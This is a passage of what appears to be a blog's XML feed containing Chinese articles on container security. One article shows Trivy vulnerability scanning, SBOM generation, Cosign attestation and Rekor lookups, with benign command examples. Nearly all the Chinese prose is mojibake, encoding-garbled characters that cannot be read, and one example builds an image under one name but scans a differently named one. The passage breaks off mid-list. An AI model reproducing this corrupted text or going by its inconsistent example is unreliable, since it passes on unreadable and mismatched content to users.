”ç©¶å‘˜çš„æ€è€ƒ</h2><p>å®¹å™¨å’Œå®¹å™¨ç¼–æ’çš„å‡ºç°å½»åº•æ”¹å˜äº†å¼€å‘è€…çš„å¼€å‘æµç¨‹ï¼Œä½†ä½œä¸ºå®‰å…¨äººå‘˜ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•çœ‹å¾…è¿™ä¸ªç§‘æŠ€çš„æµªæ½®å‘¢ï¼Ÿ</p><p>ä»å®‰å…¨çš„è§’åº¦ä¸Šæ¥è®²ï¼Œå®¹å™¨çš„éƒ¨ç½²ç¯å¢ƒå’Œä¼ ç»Ÿçš„éƒ¨ç½²ç¯å¢ƒæ‰€é¢ä¸´é£é™©æƒ…å†µç›¸åŒã€‚ä¾‹å¦‚ï¼Œæ•°æ®çªƒå–ã€ä¿®æ”¹ç³»ç»Ÿè¡Œä¸ºå’ŒæŒ–çŸ¿ï¼ˆä½¿ç”¨ä»–äººçš„è®¡ç®—èµ„æºæ¥æŒ–æ˜è‡ªå·±çš„åŠ å¯†è´§å¸ï¼‰ç­‰ç­‰ã€‚</p><p>è™½ç„¶è¿™äº›åœ¨å®¹å™¨åŒ–çš„ç¯å¢ƒä¸­å¹¶ä¸ä¼šæœ‰ä»€ä¹ˆæ”¹å˜ï¼Œä½†å®¹å™¨ç¡®ç¡®å®å®åœ°æ”¹å˜äº†åº”ç”¨ç¨‹åºçš„è®¸å¤šæ–¹é¢çš„çŠ¶å†µï¼Œå› æ­¤è¿˜äº§ç”Ÿäº†ä¸€å¥—ä¸åŒçš„é£é™©æœºåˆ¶ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»ä»¥ä¸‹ 5 ä¸ªæ–¹é¢æ¥æ€»è§ˆå®¹å™¨æ‰€é¢ä¸´çš„é£é™©ï¼Œä»¥åŠå¦‚ä½•å¯¹å®¹å™¨è¿›è¡Œå¨èƒå»ºæ¨¡ï¼š</p><ol><li><a href="../../../../2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/index.html">ã€Š1.1 é£é™©ã€å¨èƒå’Œç¼“è§£æªæ–½ã€‹</a></li><li><a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">ã€Š1.2 å®¹å™¨å¨èƒæ¨¡å‹ã€‹</a></li><li><a href="../../../../2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/">ã€Š1.3 å®‰å…¨è¾¹ç•Œã€‹</a></li><li><a href="../../../../2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/">ã€Š1.4 å¤šç§Ÿæˆ·ã€‹</a></li><li><a href="../../../../2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/">ã€Š1.5 å®‰å…¨åŸåˆ™ã€‹</a></li></ol><h2 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬ç®€è¿°äº† Docker åŸºäºå®¹å™¨çš„æ¦‚å¿µï¼Œä¸ºå¼€å‘è€…è§£å†³äº†åº”ç”¨ç¨‹åºçš„ä¾èµ–å…³ç³»çš„é—®é¢˜ï¼Œæä¾›äº†ä¸€ç§ä¾¿æ·çš„æ‰“åŒ…æœºåˆ¶ï¼Œä»è€Œåœ¨å¼€å‘è€…ç¤¾åŒºä¸­çˆ†ç«ã€‚</p><p>ä¸ä¹…åï¼Œå®¹å™¨ç¼–æ’æ”¹å˜äº†åº”ç”¨ç¨‹åºçš„éƒ¨ç½²æ–¹å¼ï¼Œå½“ä»ä¸è®©åœ°åä¸Šäº†å®¹å™¨æŠ€æœ¯é¢†åŸŸçš„â€œå¤´æŠŠäº¤æ¤…â€ã€‚</p><p>ä»å®‰å…¨çš„è§’åº¦çœ‹å¾…è¿™æ¬¡å˜é©ï¼Œæˆ‘ä»¬éœ€è¦æ€è€ƒå®¹å™¨éƒ¨ç½²ç¯å¢ƒä¸ä¼ ç»Ÿéƒ¨ç½²ç¯å¢ƒæ‰€é¢ä¸´çš„é£é™©ç‚¹æœ‰å“ªäº›å¼‚åŒç‚¹ï¼Œä»¥åŠå¦‚ä½•å»ºç«‹ä¸€ä¸ªé€‚ç”¨äºå®¹å™¨ç¯å¢ƒçš„å¨èƒæ¨¡å‹ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»ä¸€ä¸ªè¾ƒé«˜çš„å±‚æ¬¡æ¥æ€»è§ˆå®¹å™¨æ‰€é¢ä¸´çš„é£é™©ï¼Œä»¥ä¾¿å»ºç«‹èµ·ä¸€ä¸ªå…¨å±€çš„é˜²æŠ¤è§‚ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å°çŒ«å’ªéƒ½èƒ½å¬å¾—æ‡‚çš„é•œåƒæ‰«æåŸç†ï¼ˆäºŒï¼‰</title>
    <link href="/2024/05/27/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/05/27/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ­£å¦‚ä¸Šä¸€ç¯‡æ–‡ç« æ‰€è¯´çš„ï¼Œä¸ä»…ç³»ç»Ÿè½¯ä»¶åŒ…å±‚é¢æœ‰æ¼æ´é£é™©ï¼Œåº”ç”¨ç¨‹åºå±‚é¢ä¹Ÿæœ‰æ¼æ´é£é™©ã€‚</p><p>å¾ˆå¤šåº”ç”¨ç¨‹åºéƒ½ä¼šä½¿ç”¨ç‰¹å®šçš„è¯­è¨€åŒ…ç®¡ç†å™¨å®‰è£…æ‰€éœ€è¦å®‰è£…çš„ç¬¬ä¸‰æ–¹åº“ï¼Œä¾‹å¦‚ Node.js çš„ npmã€Python çš„ pip ä»¥åŠ Java çš„ Maven ç­‰ç­‰ã€‚ä½¿ç”¨è¿™äº›å·¥å…·å®‰è£…çš„ç¬¬ä¸‰æ–¹ä¾èµ–åº“ä¹Ÿå¯èƒ½ä¼šæˆä¸ºæ½œåœ¨çš„æ¼æ´æºã€‚</p><h2 id="0x01-åº”ç”¨ç¨‹åºçº§æ¼æ´"><a href="#0x01-åº”ç”¨ç¨‹åºçº§æ¼æ´" class="headerlink" title="0x01 åº”ç”¨ç¨‹åºçº§æ¼æ´"></a>0x01 åº”ç”¨ç¨‹åºçº§æ¼æ´</h2><p>æˆ‘ä»¬åœ¨ä½¿ç”¨ Goã€C æˆ–è€… Rust ä¹‹ç±»çš„ç¼–ç¨‹è¯­è¨€çš„æ—¶å€™ï¼Œ<strong>æ—¢å¯ä»¥å°†ç¬¬ä¸‰æ–¹ä¾èµ–å®‰è£…ä¸ºå…±äº«åº“ï¼Œä¹Ÿå¯ä»¥åœ¨æ„å»ºçš„æ—¶å€™é“¾æ¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å»</strong>ã€‚</p><p>è‹¥äºŒè¿›åˆ¶æ–‡ä»¶å·²ç»é“¾æ¥äº†ä¾èµ–ï¼Œä¸ä¾é å¤–éƒ¨ç¯å¢ƒï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç§°ä¹‹ä¸ºç‹¬ç«‹å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³ standaloneã€‚standalone åœ¨å®¹å™¨åŒ–æ—¶ï¼Œå¯ä»¥é€‰æ‹©<a href="https://hub.docker.com/_/scratch" title="scratch">scratch</a>ä½œä¸ºåŸºç¡€é•œåƒã€‚</p><p>scratch é•œåƒéå¸¸ç‰¹æ®Šï¼Œå®ƒä¸åŒ…å«æ“ä½œç³»ç»Ÿã€åº“å’Œå…¶ä»–ä»»ä½•é¢„è£…è½¯ä»¶ï¼Œéå¸¸å°ã€éå¸¸ç²¾ç®€ï¼Œæ˜¯ä¸€ä¸ªç©ºçš„ã€æ²¡æœ‰ä»»ä½•å†…å®¹çš„é•œåƒã€‚</p><p><img src="/image/image_-13kFOgdzy.png" alt="å›¾ 1ï¼šscratch é•œåƒ" title="å›¾1ï¼šscratch é•œåƒ"></p><p>è¿™æ ·åšï¼Œä¸€å®šç¨‹åº¦ä¸Šç¼“è§£äº†ç³»ç»Ÿè½¯ä»¶åŒ…å±‚é¢çš„æ¼æ´é£é™©ï¼Œä½†å¦‚æœæˆ‘ä»¬ä¸çŸ¥é“åº”ç”¨ç¨‹åºä¸­æœ‰å“ªäº›ä¾èµ–ï¼Œæˆ‘ä»¬å°±æ— æ³•æ‰«æå‡ºå…¶ä¸­çš„è½¯ä»¶æ¼æ´äº†ã€‚</p><h2 id="0x02-å¯¹å®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºæ¼æ´è¿›è¡Œæ‰«æ"><a href="#0x02-å¯¹å®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºæ¼æ´è¿›è¡Œæ‰«æ" class="headerlink" title="0x02 å¯¹å®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºæ¼æ´è¿›è¡Œæ‰«æ"></a>0x02 å¯¹å®¹å™¨ä¸­çš„åº”ç”¨ç¨‹åºæ¼æ´è¿›è¡Œæ‰«æ</h2><h3 id="2-1-å·²çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶"><a href="#2-1-å·²çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶" class="headerlink" title="2.1 å·²çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶"></a>2.1 å·²çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒGolang ç¼–è¯‘å™¨ä¼šå°†ä¾èµ–ä¿¡æ¯åµŒå…¥åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ã€‚è‹¥æˆ‘ä»¬ä½¿ç”¨å®¹å™¨é•œåƒæ‰«æå™¨<a href="https://github.com/aquasecurity/trivy" title="Trivy">Trivy</a>è¿›è¡Œæ‰«æï¼Œå°±å¯ä»¥<strong>æå–å‡ºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„ä¾èµ–ä¿¡æ¯å¹¶è¿›è¡Œæ¼æ´åˆ†æ</strong>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image  --scanners vuln  --vuln-type library vulhub/grafana:8.2.6<br></code></pre></td></tr></table></figure><p><img src="/image/image_Yyf2-Lun9d.png" alt="å›¾ 2ï¼šä½¿ç”¨ trivy æ‰«æé•œåƒ vulhub&#x2F;grafana:8.2.6 ä¸­çš„åº”ç”¨ç¨‹åºçº§æ¼æ´" title="å›¾2ï¼šä½¿ç”¨ trivy æ‰«æé•œåƒ vulhub&#x2F;grafana:8.2.6 ä¸­çš„åº”ç”¨ç¨‹åºçº§æ¼æ´"></p><h3 id="2-2-ä¸çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶"><a href="#2-2-ä¸çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶" class="headerlink" title="2.2 ä¸çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶"></a>2.2 ä¸çŸ¥åº”ç”¨ç¨‹åºçš„ä¾èµ–æ—¶</h3><p>ä½† Java å’Œ Rust åº”ç”¨ç¨‹åºå´æ²¡æœ‰å°†ä¾èµ–é¡¹åŠ è½½åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸çŸ¥é“æœ‰å“ªäº›ä¾èµ–äº†ã€‚</p><p>å¤§å¤šæ•°å®‰å…¨æ‰«æå™¨éƒ½æ˜¯é€šè¿‡å¯»æ‰¾åº”ç”¨ç¨‹åºä¸­çš„ä¾èµ–æ¥å‘ç°æ¼æ´çš„ï¼Œæ‰€ä»¥è‹¥è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…³é”®åœ¨äº<strong>å¦‚ä½•å°†ä¾èµ–ä¿¡æ¯ä¸äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œå…³è”ã€‚</strong></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸ª Trivy æå‡ºæ¥çš„è¾ƒä¸ºå‰æ²¿çš„è§£å†³æ–¹æ¡ˆï¼Œä¸è¿‡æˆ‘ä»¬å…ˆç®€å•äº†è§£ä¸€ä¸‹ SBOMã€Cosign å’Œ Rekor çš„åŸºæœ¬æ¦‚å¿µå’Œåº”ç”¨ã€‚</p><h4 id="2-2-1-SBOM"><a href="#2-2-1-SBOM" class="headerlink" title="2.2.1 SBOM"></a>2.2.1 SBOM</h4><p><a href="https://www.cisa.gov/sbom" title="SBOM">SBOM</a>ï¼ˆSoftware Bill of Materialsï¼Œè½¯ä»¶ç‰©æ–™æ¸…å•ï¼‰æ˜¯ä¸€ä»½è®°å½•è½¯ä»¶ç»„ä»¶åŠå…¶ä¾èµ–é¡¹çš„è¯¦ç»†æ¸…å•ï¼Œç”¨äºæé«˜è½¯ä»¶ä¾›åº”é“¾çš„é€æ˜åº¦å’Œå®‰å…¨æ€§ã€‚</p><p><img src="/image/image_kQaGWksvLT.png" alt="å›¾ 3ï¼šSBOM çš„å®˜æ–¹ä»‹ç»" title="å›¾3ï¼šSBOM çš„å®˜æ–¹ä»‹ç»"></p><p>Trivy å¯ä»¥å¯¹å®¹å™¨é•œåƒè¿›è¡Œæ‰«æï¼Œå¹¶ç”Ÿæˆä¸€ä»½ SBOM ä»¥ä¾›å…¶ä»–æ‰«æå™¨è¿›è¡Œå®‰å…¨æ‰«æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --format cyclonedx --output result.cdx alpine:3.15<br></code></pre></td></tr></table></figure><p><img src="/image/image_IZqVr4pa48.png" alt="å›¾ 4ï¼šä½¿ç”¨ Trivy å¯¹ alpine:3.15 é•œåƒè¿›è¡Œæ‰«æï¼Œå¹¶ç”Ÿæˆ SBOM" title="å›¾4ï¼šä½¿ç”¨ Trivy å¯¹ alpine:3.15 é•œåƒè¿›è¡Œæ‰«æï¼Œå¹¶ç”Ÿæˆ SBOM"></p><h4 id="2-2-2-Cosign"><a href="#2-2-2-Cosign" class="headerlink" title="2.2.2 Cosign"></a>2.2.2 Cosign</h4><p><a href="https://github.com/sigstore/cosign" title="Cosign">Cosign</a> æ˜¯ä¸€ä¸ªç”± Sigstore æä¾›çš„å·¥å…·ï¼Œç”¨äºå¯¹å®¹å™¨é•œåƒè¿›è¡Œç­¾åå’ŒéªŒè¯ï¼Œä»¥å¢å¼ºä¾›åº”é“¾å®‰å…¨ Cosign å¯ä»¥ä½¿ç”¨æœ¬åœ°å¯†é’¥è¿›è¡Œç­¾åï¼Œä¹Ÿå¯ä»¥é€šè¿‡ OpenID Connect åè®®è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œå®ç°æ— éœ€å¯†é’¥çš„ç­¾åã€‚</p><ul><li><p><strong>ä½¿ç”¨æœ¬åœ°å¯†é’¥è¿›è¡Œç­¾å</strong></p><ol><li><p>é¦–å…ˆï¼Œéœ€è¦è¿è¡Œä»¥ä¸‹å‘½ä»¤å°†ç”Ÿæˆä¸€å¯¹å…¬é’¥å’Œå¯†é’¥ï¼Œæ›´å¤šä¿¡æ¯è¯·é˜…è¯»<a href="https://docs.sigstore.dev/key_management/overview/" title="cosignçš„å®˜ç½‘ä¸­å…³äºå¯†é’¥ç®¡ç†éƒ¨åˆ†">cosign çš„å®˜ç½‘ä¸­å…³äºå¯†é’¥ç®¡ç†éƒ¨åˆ†</a>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign generate-key-pair<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Trivy ç”Ÿæˆä¸€ä¸ª Cosign æ¼æ´æ‰«æè®°å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --format cosign-vuln --output vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>æœ€åï¼Œä½¿ç”¨ cosign ç”Ÿæˆçš„å¯†é’¥å¯¹æ¼æ´æ‰«æè®°å½•è¿›è¡Œç­¾åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign attest --key /path/to/cosign.key --<span class="hljs-built_in">type</span> vuln --predicate vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>æ­¤å¤–ï¼Œå¯ä»¥éªŒè¯é•œåƒä¸Šçš„æ¼æ´æ‰«æç­¾åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign verify-attestation --key /path/to/cosign.pub --<span class="hljs-built_in">type</span> vuln &lt;IMAGE&gt;<br><br></code></pre></td></tr></table></figure></li></ol></li><li><p><strong>ä½¿ç”¨æ— å¯†é’¥è¿›è¡Œç­¾å</strong></p><ol><li><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Trivy ç”Ÿæˆä¸€ä¸ª Cosign æ¼æ´æ‰«æè®°å½•ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --format cosign-vuln --output vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åï¼Œæˆ‘ä»¬é€šè¿‡ OpenID Connect åè®®è¿›è¡Œèº«ä»½éªŒè¯ï¼Œæ”¯æŒæ­¤åè®®çš„åº”ç”¨æœ‰ Googleã€GitHub å’Œ Microsoft ç­‰ç­‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign attest --<span class="hljs-built_in">type</span> vuln --predicate vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥éªŒè¯é•œåƒä¸Šçš„æ¼æ´æ‰«æç­¾åã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign verify-attestation --certificate=path-to-the-certificate --<span class="hljs-built_in">type</span> vuln --certificate-identity Email-used-to-sign  --certificate-oidc-issuer=<span class="hljs-string">&#x27;the-issuer-used&#x27;</span> &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li></ol></li></ul><h4 id="2-2-2-Rekor"><a href="#2-2-2-Rekor" class="headerlink" title="2.2.2  Rekor"></a>2.2.2  Rekor</h4><p><a href="https://github.com/sigstore/rekor" title="Rekor">Rekor</a> æ˜¯<a href="https://www.sigstore.dev/" title="Sigstore">Sigstore</a> å¼€å‘çš„ä¸€ä¸ªå…¬å…±çš„ã€ä¸å¯å˜çš„ç­¾åå…ƒæ•°æ®é€æ˜æ—¥å¿—ã€‚Rekor å¯ä»¥ä½œä¸ºä¸€ä¸ªæƒå¨æœºæ„ï¼Œå¯¹è½¯ä»¶ä¸­æ›´æ”¹çš„å…ƒæ•°æ®è¿›è¡ŒéªŒè¯å¹¶ç­¾åã€‚</p><p>ä¸ºäº†è·Ÿè¸ªå’ŒéªŒè¯è½¯ä»¶ä¸­çš„æ›´æ”¹éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç­¾è¿‡åçš„å…ƒæ•°æ®å‘é€å¹¶å­˜å‚¨åœ¨ Rekor ä¸­ï¼Œè¿™æ ·æ¯ä¸ªæœ‰æƒè®¿é—®æ—¥å¿—æ•°æ®çš„äººéƒ½å¯ä»¥éªŒè¯èµ„æºå’Œå®ä½“å‘ç”Ÿäº†å“ªäº›æ›´æ”¹ä»¥åŠè°æˆæƒäº†è¿™äº›æ›´æ”¹ã€‚</p><p><img src="/image/image_6TpT6FrO0J.png" alt="å›¾ 5ï¼šRekor çš„ Github é¡¹ç›®ä¸»é¡µ" title="å›¾5ï¼šRekorçš„Github é¡¹ç›®ä¸»é¡µ"></p><p>ç”±äº Rekor æä¾›äº†ä¸å¯å˜çš„è®°å½•ï¼Œæ•°æ®ä¸€æ—¦å­˜å‚¨å°±æ— æ³•æ›´æ”¹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æ•°æ®å‘é€åˆ°å…¬å…±çš„ Rekor å®ä¾‹ä¸­ï¼Œä¹Ÿå¯ä»¥åœ¨ç»„ç»‡å†…éƒ¨è‡ªå·±å¯åŠ¨ä¸€ä¸ª Rekor å®ä¾‹ï¼Œè¿™å¯¹äºè·¨å›¢é˜Ÿçš„æ›´æ”¹éªŒè¯éå¸¸æœ‰æ•ˆã€‚ä½†è¯·æ³¨æ„ï¼ŒSigstore å›¢é˜Ÿç»´æŠ¤çš„ Rekor å…¬å…±å®ä¾‹é™åˆ¶äº†è¯æ˜çš„å¤§å°ã€‚å¦‚æœæ‚¨ä½¿ç”¨å…¬å…±çš„å®ä¾‹ï¼Œéœ€ç¡®ä¿ SBOM è¶³å¤Ÿå°ï¼Œè¯¦æƒ…è¯·é˜…è¯» Rekor çš„<a href="https://github.com/sigstore/rekor" title="å®˜æ–¹æ–‡æ¡£">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><h4 id="2-2-3-æ¡ˆä¾‹ï¼šbat"><a href="#2-2-3-æ¡ˆä¾‹ï¼šbat" class="headerlink" title="2.2.3 æ¡ˆä¾‹ï¼šbat"></a>2.2.3 æ¡ˆä¾‹ï¼šbat</h4><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥ Rust åº”ç”¨ç¨‹åº<a href="https://github.com/sharkdp/bat" title="bat">bat</a>ä½œä¸ºç¤ºä¾‹è¿›è¡Œè¯´æ˜ã€‚<code>bat</code>æ˜¯ä»<code>cat</code>å…‹éš†å‡ºæ¥çš„ï¼Œä½†æœ‰è¯­æ³•é«˜äº®å’Œå…¶ä»–çš„è®¸å¤šé«˜çº§åŠŸèƒ½ã€‚</p><ol><li><p>æˆ‘ä»¬å…ˆå°†<code>bat</code>çš„ä»£ç ä»“åº“æ‹‰ä¸‹æ¥ï¼Œå¹¶ä½¿ç”¨ trivy å¯¹å…¶ä»£ç ä»“åº“è¿›è¡Œæ‰«æå¹¶ç”Ÿæˆ SBOM æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> -b v0.20.0 https://github.com/sharkdp/bat  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy fs --format cyclonedx --output bat.cdx ./bat/Cargo.lock<br></code></pre></td></tr></table></figure></li><li><p>å‡†å¤‡ä¸€ä¸ª <code>bat</code> äºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/sharkdp/bat/releases/download/v0.20.0/bat-v0.20.0-x86_64-apple-darwin.tar.gz<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xvf bat-v0.20.0-x86_64-apple-darwin.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>Cosign ç›®å‰ä¸æ”¯æŒ blob è®¤è¯çš„æ— å¯†é’¥ç­¾åï¼Œå› æ­¤éœ€è¦å…ˆä¸‹è½½ Trivy çš„æ’ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy plugin install github.com/aquasecurity/trivy-plugin-attest<br></code></pre></td></tr></table></figure></li><li><p>å°† SBOM è¯æ˜é“¾æ¥åˆ°<code>bat</code>Rekor å®ä¾‹ä¸­çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy attest --predicate ./bat.cdx --<span class="hljs-built_in">type</span> cyclonedx ./bat-v0.20.0-x86_64-apple-darwin/bat<br></code></pre></td></tr></table></figure></li><li><p>Trivy ä¼šè®¡ç®—<code>bat</code>äºŒè¿›åˆ¶æ–‡ä»¶çš„æ‘˜è¦ï¼Œå¹¶åœ¨ Rekor ä¸­æœç´¢æ‘˜è¦ä¸­çš„ SBOM è¯æ˜ã€‚å¦‚æœæ‰¾åˆ°ï¼ŒTrivy å°†ä½¿ç”¨å®ƒè¿›è¡Œæ¼æ´æ‰«æã€‚è¯·æ³¨æ„ï¼Œä½†æˆ‘ä»¬ä½¿ç”¨<code>--sbom-sources</code>æ¥åœ¨ç½‘ä¸Šå‘ Rekor æŸ¥è¯¢æ‰€æœ‰æœªæ‰“åŒ…çš„äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼ŒTrivy çš„æ‰«æé€Ÿåº¦ä¼šå˜æ…¢ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy fs --sbom-sources rekor ./bat-v0.20.0-x86_64-apple-darwin/bat<br></code></pre></td></tr></table></figure></li><li><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å°†æ­¤æ–¹æ³•åº”ç”¨äºé•œåƒä¸­ä¸çŸ¥é“ä¾èµ–çš„åº”ç”¨ç¨‹åºçš„æ¼æ´æ‰«æï¼Œå³åœ¨è¯¥ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å°†<code>bat</code>äºŒè¿›åˆ¶æ–‡ä»¶æ·»åŠ åˆ°é•œåƒä¸­ã€‚</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> bat bat</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t miao2sec/bat:demo-1  .<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --sbom-sources rekor --scanners vuln alpine-with-bat<br></code></pre></td></tr></table></figure></li></ol><h4 id="2-2-4-æ€»ç»“ï¼šä½¿ç”¨-Trivy-å°†æ‰€æœ‰çš„ä¿¡æ¯æ•´åˆèµ·æ¥"><a href="#2-2-4-æ€»ç»“ï¼šä½¿ç”¨-Trivy-å°†æ‰€æœ‰çš„ä¿¡æ¯æ•´åˆèµ·æ¥" class="headerlink" title="2.2.4 æ€»ç»“ï¼šä½¿ç”¨ Trivy å°†æ‰€æœ‰çš„ä¿¡æ¯æ•´åˆèµ·æ¥"></a>2.2.4 æ€»ç»“ï¼šä½¿ç”¨ Trivy å°†æ‰€æœ‰çš„ä¿¡æ¯æ•´åˆèµ·æ¥</h4><p>Trivy åœ¨ v0.33 ä¸­å‘å¸ƒäº†ä¸€ç§å®éªŒæ€§çš„æ–¹æ³•ï¼šå…ˆå¯¹åº”ç”¨ç¨‹åºçš„ä»£ç ä»“åº“è¿›è¡Œæ‰«æï¼Œç”Ÿæˆä¸€ä¸ªåŒ…å«å…¶æ‰€æœ‰ä¾èµ–ä¿¡æ¯çš„ SBOMï¼Œç„¶åä½¿ç”¨ Trivy çš„æ’ä»¶å°†åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶å’Œ SBOM è¿›è¡Œç»‘å®šï¼Œå…·ä½“è¡¨ç°ä¸ºï¼š</p><ol><li>ä½¿ç”¨ cosign å¯¹ SBOM è¿›è¡Œç­¾åã€‚</li><li>ç„¶åå°† 